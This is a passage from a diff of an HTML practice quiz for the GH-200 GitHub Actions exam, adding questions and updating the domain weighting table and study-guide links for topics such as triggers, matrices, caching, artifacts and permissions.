@@ -259,15 +259,16 @@
   <!-- ===================== INTRO ===================== -->
   <div id="intro" class="intro-card">
     <h1>GH-200 Practice Run</h1>
-    <p>80 questions pulled from your six chapters, weighted to match the real exam's domain split. Every wrong answer is explained, and most distractors are drawn straight from your "Common Mistakes" sections — so a miss here should look familiar.</p>
+    <p><strong>126 questions</strong> across the six study domains in this guide. Foundations is a 5-question warm-up and is unweighted; the remaining 121 questions cover the five exam domains. Every question includes an answer explanation; newly added high-yield questions also include an exam hint and a targeted official GitHub Docs reference where useful. Most distractors are drawn from the guide's "Common Mistakes" sections.</p>
     <table class="weight-table">
       <tr><th>Domain</th><th>Questions</th></tr>
       <tr><td>Foundations (warm-up, unweighted)</td><td>5</td></tr>
-      <tr><td>Author &amp; Manage Workflows</td><td>20</td></tr>
-      <tr><td>Consume &amp; Troubleshoot Workflows</td><td>14</td></tr>
-      <tr><td>Author &amp; Maintain Actions</td><td>14</td></tr>
-      <tr><td>Manage for the Enterprise</td><td>18</td></tr>
-      <tr><td>Secure &amp; Optimize Automation</td><td>9</td></tr>
+      <tr><td>Author &amp; Manage Workflows</td><td>30</td></tr>
+      <tr><td>Consume &amp; Troubleshoot Workflows</td><td>20</td></tr>
+      <tr><td>Author &amp; Maintain Actions</td><td>21</td></tr>
+      <tr><td>Manage for the Enterprise</td><td>31</td></tr>
+      <tr><td>Secure &amp; Optimize Automation</td><td>19</td></tr>
+      <tr><th>Total</th><th>126</th></tr>
     </table>
     <button class="start-btn" onclick="startQuiz()">Start the run →</button>
   </div>
@@ -276,7 +277,7 @@
   <div id="quiz" class="hidden">
     <div class="run-header">
       <div class="run-title">GH-200 Practice Run <span class="id">#1</span></div>
-      <div class="run-sub" id="qcounter">Question 1 / 80</div>
+      <div class="run-sub" id="qcounter">Question 1 / 126</div>
     </div>
 
     <div class="tracker" id="tracker"></div>
@@ -330,255 +331,594 @@ const QUESTIONS = [
 // ---------------- FOUNDATIONS (5) ----------------
 {d:"foundations", q:"What is the correct nesting order of GitHub Actions concepts, from largest to smallest?",
  o:["Workflow → Job → Step → Action","Job → Workflow → Action → Step","Action → Step → Job → Workflow","Step → Action → Workflow → Job"],
- c:0, e:"A repository holds workflows; a workflow (triggered by an event) contains jobs; a job contains steps; a step either runs a shell command or calls a packaged action. 🔗 <a href='00_chapter_foundations.md#01-the-core-vocabulary' target='_blank'>Related diagram: Chapter 0 §0.1 (hierarchy diagram)</a>."},
+ c:0, e:"A repository holds workflows; a workflow (triggered by an event) contains jobs; a job contains steps; a step either runs a shell command or calls a packaged action. 🔗 <a href='https://karthikreddy432.github.io/GH200/00_chapter_foundations.html#01-the-core-vocabulary' target='_blank'>Related diagram: Chapter 0 §0.1 (hierarchy diagram)</a>."},
 {d:"foundations", q:"By default, how do multiple jobs in the same workflow execute relative to each other?",
  o:["Sequentially, in the order they're declared","In parallel, unless a job specifies needs:","Randomly, GitHub chooses the order","Only one job runs per workflow trigger"],
- c:1, e:"Jobs run in parallel by default. Adding needs: to a job forces it to wait for the listed job(s) to finish first. 🔗 <a href='00_chapter_foundations.md#01-the-core-vocabulary' target='_blank'>Related diagram: Chapter 0 §0.1 (hierarchy diagram)</a>."},
+ c:1, e:"Jobs run in parallel by default. Adding needs: to a job forces it to wait for the listed job(s) to finish first. 🔗 <a href='https://karthikreddy432.github.io/GH200/00_chapter_foundations.html#01-the-core-vocabulary' target='_blank'>Related diagram: Chapter 0 §0.1 (hierarchy diagram)</a>."},
 {d:"foundations", q:"A `test` job writes a file to disk, and a later `build` job (with `needs: test`) can't find it. What's the most likely explanation?",
  o:["The file was deleted by a cleanup step","Each job runs on a fresh, isolated runner — nothing persists across jobs unless explicitly passed","needs: only controls job order, not job execution at all","This is a bug in GitHub Actions"],
- c:1, e:"Every job gets its own fresh runner. Data must be passed explicitly via artifacts, cache, or job outputs — nothing on disk carries over automatically, even with needs:."},
+ c:1, e:"Every job gets its own fresh runner. Data must be passed explicitly via artifacts, cache, or job outputs — nothing on disk carries over automatically, even with needs:. 📖 <a href='https://karthikreddy432.github.io/GH200/00_chapter_foundations.html#01-the-core-vocabulary' target='_blank'>Study guide: Chapter 0 §0.1 — Core vocabulary</a>."},
 {d:"foundations", q:"Why does actions/checkout@v4 almost always need to be the first step in a job?",
  o:["It installs Node.js on the runner","A fresh runner starts with an empty filesystem — checkout is what clones your repo onto it","It sets required environment variables for later steps","It is required by GitHub's terms of service"],
- c:1, e:"Runners start empty. If a later step (like npm install) needs your repo's files, checkout must run first, or that step fails against a nonexistent file."},
+ c:1, e:"Runners start empty. If a later step (like npm install) needs your repo's files, checkout must run first, or that step fails against a nonexistent file. 📖 <a href='https://karthikreddy432.github.io/GH200/00_chapter_foundations.html#01-the-core-vocabulary' target='_blank'>Study guide: Chapter 0 §0.1 — Core vocabulary</a>."},
 {d:"foundations", q:"What's the practical implication of ubuntu-latest being a moving label rather than a fixed version?",
  o:["It has no practical implication — the label never changes","Workflows needing a reproducible environment should pin an explicit version like ubuntu-24.04","ubuntu-latest workflows cannot use actions/checkout","It only affects self-hosted runners"],
- c:1, e:"ubuntu-latest currently resolves to Ubuntu 24.04, but that mapping moves over time (e.g., ubuntu-22.04 entering deprecation). Pin an explicit version if you need reproducibility."},
+ c:1, e:"ubuntu-latest currently resolves to Ubuntu 24.04, but that mapping moves over time (e.g., ubuntu-22.04 entering deprecation). Pin an explicit version if you need reproducibility. 📖 <a href='https://karthikreddy432.github.io/GH200/00_chapter_foundations.html#01-the-core-vocabulary' target='_blank'>Study guide: Chapter 0 §0.1 — Core vocabulary</a>."},
 
-// ---------------- AUTHOR & MANAGE WORKFLOWS (20) ----------------
+// ---------------- AUTHOR & MANAGE WORKFLOWS (30) ----------------
 {d:"workflows", q:"By default, which event types does a `pull_request` trigger fire on if `types:` is not specified?",
  o:["All PR event types, including labeled and closed","opened, synchronize, and reopened only","opened only","Every push to the PR branch, regardless of PR state"],
- c:1, e:"pull_request defaults to opened, synchronize, reopened. A common mistake is expecting it to also fire on labeled without adding that type explicitly."},
+ c:1, e:"pull_request defaults to opened, synchronize, reopened. A common mistake is expecting it to also fire on labeled without adding that type explicitly. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"A team wants a nightly `schedule` job to run at exactly 3:00 AM in their local timezone. What should they know about `schedule:` cron?",
  o:["Cron times in schedule: are always UTC, and GitHub explicitly notes scheduled runs can be delayed under high load","Cron times respect the repository's configured timezone automatically","Scheduled workflows are guaranteed to start at the exact second specified","schedule: cannot be combined with other triggers in the same workflow"],
- c:0, e:"schedule cron is always UTC and is not a real-time guarantee — GitHub states runs can be delayed during high load."},
+ c:0, e:"schedule cron is always UTC and is not a real-time guarantee — GitHub states runs can be delayed during high load. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"Which `on:` configuration correctly skips a workflow for documentation-only changes?",
  o:["paths: ['!**.md']","paths-ignore: ['**.md', 'docs/**']","branches-ignore: ['**.md']","exclude-paths: ['docs/**']"],
- c:1, e:"paths-ignore (or paths: with a leading ! to negate) filters out changes touching only the listed patterns before any job is even considered."},
+ c:1, e:"paths-ignore (or paths: with a leading ! to negate) filters out changes touching only the listed patterns before any job is even considered. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"How many typed inputs can a single workflow_dispatch trigger define, and what are the valid types?",
  o:["Unlimited inputs; only string and boolean types exist","Max 10 inputs; types are string, number, boolean, choice, environment","Max 5 inputs; types are string and number only","Max 20 inputs; any YAML type is valid"],
- c:1, e:"workflow_dispatch supports exactly five input types (string, number, boolean, choice, environment) with a hard cap of 10 inputs per trigger."},
+ c:1, e:"workflow_dispatch supports exactly five input types (string, number, boolean, choice, environment) with a hard cap of 10 inputs per trigger. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"What makes the `type: environment` workflow_dispatch input special compared to `type: choice`?",
  o:["It behaves identically to choice — just a naming convention","It renders a dropdown of the repo's actual configured Environments, and environment protection rules are enforced when that value is used as the job's environment:","It can only be used with self-hosted runners","It requires an enterprise plan"],
- c:1, e:"type: environment ties the manual input directly to real Environments and their approval/protection rules — a mechanism connecting dispatch inputs to approval gates."},
+ c:1, e:"type: environment ties the manual input directly to real Environments and their approval/protection rules — a mechanism connecting dispatch inputs to approval gates. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"A job has `if: inputs.dry_run == false` where dry_run is a workflow_dispatch boolean input. Inside a later `run:` step, the same value is referenced as `${{ inputs.dry_run }}`. What's true about how this value behaves in each context?",
  o:["It's a string in both contexts","It's a real boolean in the if: expression context, but a literal string \"true\"/\"false\" once interpolated inside a run: shell block","It's a real boolean in both contexts","It's undefined inside run: blocks"],
- c:1, e:"This is a classic exam trap: inputs.dry_run is a genuine boolean in if: expression syntax, but becomes the literal text \"true\"/\"false\" once dropped into a run: shell block."},
+ c:1, e:"This is a classic exam trap: inputs.dry_run is a genuine boolean in if: expression syntax, but becomes the literal text \"true\"/\"false\" once dropped into a run: shell block. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"A repository variable and a repository secret both store the string \"us-east-1\". What's the key practical difference?",
  o:["There is no difference — vars and secrets behave identically","vars values are plaintext and visible in the UI; secrets are encrypted at rest and masked in logs","secrets can only be used in reusable workflows","vars are only available to self-hosted runners"],
- c:1, e:"vars is for non-sensitive plaintext config (fine to be visible); secrets are encrypted and masked in logs. Storing a sensitive value in vars by mistake can leak it in plaintext logs."},
+ c:1, e:"vars is for non-sensitive plaintext config (fine to be visible); secrets are encrypted and masked in logs. Storing a sensitive value in vars by mistake can leak it in plaintext logs. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"What is the current, non-deprecated way to set a step output for use by later steps or jobs?",
  o:["echo \"::set-output name=x::value\"","Writing to the $GITHUB_OUTPUT environment file, e.g. echo \"x=value\" >> \"$GITHUB_OUTPUT\"","Setting a workflow-level env: variable","Using core.export() inside a run: block"],
- c:1, e:"::set-output is deprecated and was disabled for security reasons. The current mechanism is appending key=value to the $GITHUB_OUTPUT file."},
+ c:1, e:"::set-output is deprecated and was disabled for security reasons. The current mechanism is appending key=value to the $GITHUB_OUTPUT file. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"Job A sets a step output via $GITHUB_OUTPUT, but Job B (needs: A) can't see it via needs.A.outputs.x, even though the step itself ran correctly. What's missing?",
  o:["Job B needs a permissions: block","Job A must declare a job-level outputs: map that references steps.<id>.outputs.x — step outputs aren't visible outside their own job otherwise","Outputs can never cross job boundaries under any configuration","Job A's step needs a shell: declaration"],
- c:1, e:"Step outputs (steps.<id>.outputs.x) are scoped to that job only. To expose them to other jobs via needs.<job>.outputs, the producing job must explicitly declare a job-level outputs: mapping."},
+ c:1, e:"Step outputs (steps.<id>.outputs.x) are scoped to that job only. To expose them to other jobs via needs.<job>.outputs, the producing job must explicitly declare a job-level outputs: mapping. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"If an upstream job listed in needs: fails, what happens to the downstream job by default?",
  o:["It runs anyway, ignoring the failure","It is skipped — the default implicit condition is success()","It retries the upstream job automatically","It runs but is marked as a warning"],
- c:1, e:"Downstream jobs have an implicit if: success() condition, so a failed upstream dependency causes them to be skipped, not run, by default. 🔗 <a href='01_chapter_author_manage_workflows.md#14-job-dependencies-conditionals-and-execution-control' target='_blank'>Related diagram: Chapter 1 §1.4 (job dependency graph)</a>."},
+ c:1, e:"Downstream jobs have an implicit if: success() condition, so a failed upstream dependency causes them to be skipped, not run, by default. 🔗 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#14-job-dependencies-conditionals-and-execution-control' target='_blank'>Related diagram: Chapter 1 §1.4 (job dependency graph)</a>."},
 {d:"workflows", q:"You want a cleanup/notification job to run regardless of whether upstream jobs succeeded, failed, or were cancelled. Which condition function should you use?",
  o:["success()","failure()","cancelled()","always()"],
- c:3, e:"always() runs the job/step unconditionally regardless of upstream status — the standard pattern for cleanup or notification steps. 🔗 <a href='01_chapter_author_manage_workflows.md#14-job-dependencies-conditionals-and-execution-control' target='_blank'>Related diagram: Chapter 1 §1.4 (job dependency graph)</a>."},
+ c:3, e:"always() runs the job/step unconditionally regardless of upstream status — the standard pattern for cleanup or notification steps. 🔗 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#14-job-dependencies-conditionals-and-execution-control' target='_blank'>Related diagram: Chapter 1 §1.4 (job dependency graph)</a>."},
 {d:"workflows", q:"You have unit-tests and integration-tests with no dependency on each other, followed by build-image needing both, followed by push-image which should run only after build-image succeeds on pushes to main. How do you express 'build-image waits for BOTH test jobs'?",
  o:["needs: unit-tests\\nneeds: integration-tests (two separate needs: keys)","needs: [unit-tests, integration-tests]","if: unit-tests.result == 'success' && integration-tests.result == 'success'","strategy: matrix: [unit-tests, integration-tests]"],
- c:1, e:"needs: accepts a list — needs: [unit-tests, integration-tests] waits for both to succeed before build-image starts. Omitting needs: entirely on the two test jobs is what lets them run in parallel."},
+ c:1, e:"needs: accepts a list — needs: [unit-tests, integration-tests] waits for both to succeed before build-image starts. Omitting needs: entirely on the two test jobs is what lets them run in parallel. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 {d:"workflows", q:"Given a matrix with os: [ubuntu-latest, windows-latest] and python: ['3.10','3.11','3.12'], with exclude: removing (windows, 3.10), and include: adding (macos-latest, 3.12), how many jobs actually run?",
  o:["5","6","7","9"],
- c:1, e:"Base Cartesian product = 2×3 = 6. exclude removes (windows,3.10) → 5. include then adds a brand-new (macos-latest,3.12) combination outside the original grid → 6 total. exclude always applies before include. 🔗 <a href='01_chapter_author_manage_workflows.md#15-matrix-builds' target='_blank'>Related diagram: Chapter 1 §1.5 (matrix expansion)</a> — or try the <a href='08_interactive_companion.html#matrix' target='_blank'>Interactive Companion's Matrix Math tab</a> with these exact numbers."},
+ c:1, e:"Base Cartesian product = 2×3 = 6. exclude removes (windows,3.10) → 5. include then adds a brand-new (macos-latest,3.12) combination outside the original grid → 6 total. exclude always applies before include. 🔗 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#15-matrix-builds' target='_blank'>Related diagram: Chapter 1 §1.5 (matrix expansion)</a> — or try the <a href='08_interactive_companion.html#matrix' target='_blank'>Interactive Companion's Matrix Math tab</a> with these exact numbers."},
 {d:"workflows", q:"What does `fail-fast` default to in a matrix strategy, and what does it control?",
  o:["Defaults to false; controls whether the matrix runs in parallel","Defaults to true; one matrix job failing cancels all other in-progress/queued matrix jobs","Defaults to true; it stops the entire workflow, not just the matrix","There is no default — it must always be set explicitly"],
- c:1, e:"fail-fast defaults to true. Set it to false explicitly if you want every matrix combination's result, which is common during debugging."},
+ c:1, e:"fail-fast defaults to true. Set it to false explicitly if you want every matrix combination's result, which is common during debugging. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#15-matrix-builds' target='_blank'>Study guide: Chapter 1 §1.5 — Matrix Builds</a>."},
 {d:"workflows", q:"What is the hard cap on the number of jobs a single matrix strategy can generate?",
  o:["50","100","256","1000"],
- c:2, e:"GitHub Actions caps a matrix at 256 generated jobs. Exceeding this requires restructuring the matrix or splitting across multiple reusable workflow calls. 🔗 <a href='01_chapter_author_manage_workflows.md#15-matrix-builds' target='_blank'>Related diagram: Chapter 1 §1.5 (matrix expansion)</a>."},
+ c:2, e:"GitHub Actions caps a matrix at 256 generated jobs. Exceeding this requires restructuring the matrix or splitting across multiple reusable workflow calls. 🔗 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#15-matrix-builds' target='_blank'>Related diagram: Chapter 1 §1.5 (matrix expansion)</a>."},
 {d:"workflows", q:"An integration-test job intermittently fails with 'connection refused' against a Postgres service container, especially on fresh runs. What's the most likely missing piece?",
  o:["The service is missing a ports: mapping","The service is missing a health-check in options: (e.g. --health-cmd pg_isready), so steps can start before Postgres is ready to accept connections","The job needs actions/checkout before the services: block","Service containers require self-hosted runners"],
- c:1, e:"Without a health check, GitHub Actions has no way to know Postgres isn't ready yet — the container starting isn't the same as the database accepting connections. Health-check options close this race condition."},
+ c:1, e:"Without a health check, GitHub Actions has no way to know Postgres isn't ready yet — the container starting isn't the same as the database accepting connections. Health-check options close this race condition. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#16-service-containers' target='_blank'>Study guide: Chapter 1 §1.6 — Service Containers</a>."},
 {d:"workflows", q:"Which statement about service containers (services:) is accurate?",
  o:["They work identically on Windows, macOS, and Linux hosted runners","They are torn down automatically when the job ends, and are only supported the same way on Linux runners (not Windows/macOS)","They persist across all jobs in a workflow","They require a self-hosted runner"],
- c:1, e:"Service containers rely on Docker networking available natively on GitHub-hosted Linux runners. They aren't supported the same way on Windows/macOS runners, and they're always cleaned up automatically at job end."},
+ c:1, e:"Service containers rely on Docker networking available natively on GitHub-hosted Linux runners. They aren't supported the same way on Windows/macOS runners, and they're always cleaned up automatically at job end. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#16-service-containers' target='_blank'>Study guide: Chapter 1 §1.6 — Service Containers</a>."},
 {d:"workflows", q:"A workflow needs its job to comment on a pull request. Per least-privilege guidance, what's the minimum permission it should request?",
  o:["contents: write","issues: write","pull-requests: write","permissions: write-all"],
- c:2, e:"Commenting on a PR requires pull-requests: write specifically — not the broader contents: write or a blanket write-all grant."},
+ c:2, e:"Commenting on a PR requires pull-requests: write specifically — not the broader contents: write or a blanket write-all grant. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#17-permissions-scoping-workflow--job-level' target='_blank'>Study guide: Chapter 1 §1.7 — Permissions Scoping</a>."},
 {d:"workflows", q:"Setting permissions: at the workflow level (top of the YAML file) has what scope?",
  o:["It applies only to the first job","It applies to all jobs, unless a specific job defines its own permissions: block that overrides it for that job","It has no effect — permissions must always be set per-job","It only affects reusable workflow calls"],
- c:1, e:"Workflow-level permissions: apply to every job by default; an individual job can override this with its own permissions: block."},
+ c:1, e:"Workflow-level permissions: apply to every job by default; an individual job can override this with its own permissions: block. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#17-permissions-scoping-workflow--job-level' target='_blank'>Study guide: Chapter 1 §1.7 — Permissions Scoping</a>."},
 {d:"workflows", q:"What triggers a workflow via repository_dispatch?",
  o:["A scheduled cron firing","A manual click of 'Run workflow' in the UI","An external system sending a POST request to the GitHub API","A push to any branch"],
- c:2, e:"repository_dispatch lets external systems (outside GitHub) trigger a workflow by hitting the GitHub API — useful for triggering CI from an outside tool or pipeline."},
+ c:2, e:"repository_dispatch lets external systems (outside GitHub) trigger a workflow by hitting the GitHub API — useful for triggering CI from an outside tool or pipeline. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
 
-// ---------------- CONSUME & TROUBLESHOOT WORKFLOWS (14) ----------------
+// ---------------- CONSUME & TROUBLESHOOT WORKFLOWS (20) ----------------
 {d:"troubleshoot", q:"A workflow run shows a red ❌. What is the recommended, systematic first move?",
  o:["Immediately re-run the whole workflow with debug logging enabled","Find the failed job, then expand the specific failed step, then read the log carefully above the generic error line before assuming the cause","Delete and recreate the workflow file","Check the repository's billing page"],
- c:1, e:"The systematic path is: red job → red step → read the log (the real error is often buried above a generic 'exit code 1' summary) before jumping to conclusions. 🔗 <a href='02_chapter_consume_troubleshoot_workflows.md#21-a-systematic-debugging-workflow' target='_blank'>Related diagram: Chapter 2 §2.1 (systematic debugging flow)</a>."},
+ c:1, e:"The systematic path is: red job → red step → read the log (the real error is often buried above a generic 'exit code 1' summary) before jumping to conclusions. 🔗 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Related diagram: Chapter 2 §2.1 (systematic debugging flow)</a>."},
 {d:"troubleshoot", q:"Which two repository secrets, when set to 'true', enable verbose debug logging for troubleshooting?",
  o:["DEBUG_MODE and VERBOSE_LOGS","ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG","GITHUB_DEBUG and RUNNER_DEBUG","LOG_LEVEL and TRACE_ENABLED"],
- c:1, e:"ACTIONS_STEP_DEBUG (per-step verbose logs) and ACTIONS_RUNNER_DEBUG (runner-level verbose logs) are the two actual repository secrets that unlock debug logging."},
+ c:1, e:"ACTIONS_STEP_DEBUG (per-step verbose logs) and ACTIONS_RUNNER_DEBUG (runner-level verbose logs) are the two actual repository secrets that unlock debug logging. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"A step fails with 'Resource not accessible by integration'. What should you check first?",
  o:["The runner's operating system","The permissions: block — the GITHUB_TOKEN likely lacks the scope the step needs","The matrix configuration","Whether actions/checkout ran"],
- c:1, e:"This specific error signature almost always means GITHUB_TOKEN doesn't have the permission scope the API call requires — check permissions: at the workflow/job level."},
+ c:1, e:"This specific error signature almost always means GITHUB_TOKEN doesn't have the permission scope the API call requires — check permissions: at the workflow/job level. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"A job shows as grey/'Skipped' rather than red. What does this most likely mean?",
  o:["The job crashed the runner","An upstream needs: job failed, or the job's own if: condition evaluated false — this is expected behavior, not necessarily a bug","GitHub's servers were down during the run","The job's YAML has a syntax error"],
- c:1, e:"Skipped is not a failure signal by itself. It typically means either an upstream dependency failed or an if: condition evaluated false — the workflow's control flow working as designed."},
+ c:1, e:"Skipped is not a failure signal by itself. It typically means either an upstream dependency failed or an if: condition evaluated false — the workflow's control flow working as designed. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"What are the default size and idle-eviction rules for GitHub Actions caching (per repository)?",
  o:["Unlimited size, never evicted","10 GB limit by default, with caches unused for 7 days automatically evicted","1 GB limit, evicted after 30 days","5 GB limit, never evicted regardless of use"],
- c:1, e:"The default cache limit is 10 GB per repository (least-recently-used entries evicted once over), and any cache unused for 7 days is evicted regardless of the size limit."},
+ c:1, e:"The default cache limit is 10 GB per repository (least-recently-used entries evicted once over), and any cache unused for 7 days is evicted regardless of the size limit. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"Why can't you 'update' an existing actions/cache entry under the same key?",
  o:["It's a UI limitation only, not a real restriction","Caches are immutable once created by design — this guarantees safe, deterministic concurrent restores across parallel jobs; a new key (e.g. including a lockfile hash) is required for new content","GitHub charges extra for cache updates","Only enterprise accounts can update caches"],
- c:1, e:"Cache immutability is deliberate: it guarantees a cache is deterministic and safe for multiple parallel jobs to restore simultaneously without risk of a corrupted, mid-write read."},
+ c:1, e:"Cache immutability is deliberate: it guarantees a cache is deterministic and safe for multiple parallel jobs to restore simultaneously without risk of a corrupted, mid-write read. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"What does restore-keys provide, and when is cache-hit set to 'true'?",
  o:["restore-keys gives an exact match only; cache-hit is always true if any restore-keys entry matches","restore-keys provides prefix-match fallback to the most recent cache with a matching prefix; cache-hit is 'true' only on an exact key match, not a restore-keys fallback","restore-keys and cache-hit are unrelated features","cache-hit is always false when using actions/cache@v4"],
- c:1, e:"restore-keys lets you fall back to a 'close enough' prior cache via prefix matching, but cache-hit only reports 'true' on an exact key match — a partial restore-keys hit leaves it false/empty."},
+ c:1, e:"restore-keys lets you fall back to a 'close enough' prior cache via prefix matching, but cache-hit only reports 'true' on an exact key match — a partial restore-keys hit leaves it false/empty. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
 {d:"troubleshoot", q:"Which scenario correctly calls for artifacts rather than cache?",
  o:["Speeding up repeated pip install runs across unrelated workflow runs over time","Passing a compiled binary from a build job to a deploy job that needs it to function correctly","Storing OS-specific temp files that don't matter if lost","Any data under 1 MB"],
- c:1, e:"Anything correctness-critical for a downstream job — like a binary another job must have to function — belongs in artifacts, since cache is 'best effort' and may silently be missing. Cache is for speed optimizations only. 🔗 <a href='02_chapter_consume_troubleshoot_workflows.md#24-caching-vs-artifacts--choose-correctly' target='_blank'>Related diagram: Chapter 2 §2.4 (cache vs artifact decision)</a>."},
+ c:1, e:"Anything correctness-critical for a downstream job — like a binary another job must have to function — belongs in artifacts, since cache is 'best effort' and may silently be missing. Cache is for speed optimizations only. 🔗 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#24-caching-vs-artifacts--choose-correctly' target='_blank'>Related diagram: Chapter 2 §2.4 (cache vs artifact decision)</a>."},
 {d:"troubleshoot", q:"What's the default retention period for artifacts uploaded with actions/upload-artifact, and is it adjustable?",
  o:["7 days, fixed and non-adjustable","90 days, adjustable","24 hours, fixed","Artifacts never expire"],
- c:1, e:"Artifacts default to 90 days of retention and this is configurable — distinct from cache's 7-day-idle/10GB eviction rules."},
+ c:1, e:"Artifacts default to 90 days of retention and this is configurable — distinct from cache's 7-day-idle/10GB eviction rules. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#24-caching-vs-artifacts--choose-correctly' target='_blank'>Study guide: Chapter 2 §2.4 — Caching vs Artifacts</a>."},
 {d:"troubleshoot", q:"Where can a reusable workflow (workflow_call) be invoked from within a caller workflow?",
  o:["Inside any steps: list, using uses:","Only at the job level, via jobs.<id>.uses: — never inside a steps: list","Only inside a composite action","At the top level of the YAML file, outside jobs:"],
- c:1, e:"Reusable workflows are consumed at the job level (jobs.<id>.uses:). Calling reusable logic from inside a steps: list is what composite actions are for instead."},
+ c:1, e:"Reusable workflows are consumed at the job level (jobs.<id>.uses:). Calling reusable logic from inside a steps: list is what composite actions are for instead. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#25-consuming-reusable-workflows-workflow_call' target='_blank'>Study guide: Chapter 2 §2.5 — Consuming Reusable Workflows</a>."},
 {d:"troubleshoot", q:"Workflow A calls reusable workflow B with `secrets: inherit`. B then calls reusable workflow C with no secrets: key at all. Does C receive A's secrets?",
  o:["Yes, secrets: inherit cascades through the entire call chain automatically","No — secrets only pass one hop at a time; B must explicitly pass secrets (inherit or named) to C for C to receive them","Yes, but only if C is in the same repository as A","No, reusable workflows can never receive secrets under any configuration"],
- c:1, e:"secrets: inherit only propagates one hop. B receiving A's secrets does not automatically forward them to C — B must explicitly declare secrets: inherit or an explicit mapping in its own call to C. 🔗 Try it: <a href='08_interactive_companion.html#secrets' target='_blank'>Interactive Companion → Secrets Tracer tab</a> — build this exact 2-hop chain and watch what C actually receives."},
+ c:1, e:"secrets: inherit only propagates one hop. B receiving A's secrets does not automatically forward them to C — B must explicitly declare secrets: inherit or an explicit mapping in its own call to C. 🔗 Try it: <a href='08_interactive_companion.html#secrets' target='_blank'>Interactive Companion → Secrets Tracer tab</a> — build this exact 2-hop chain and watch what C actually receives. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#25-consuming-reusable-workflows-workflow_call' target='_blank'>Study guide: Chapter 2 §2.5 — Consuming Reusable Workflows</a>."},
 {d:"troubleshoot", q:"A reusable workflow's job specifies its own `environment: production`. The caller passed secrets explicitly. Which secrets does that job actually use?",
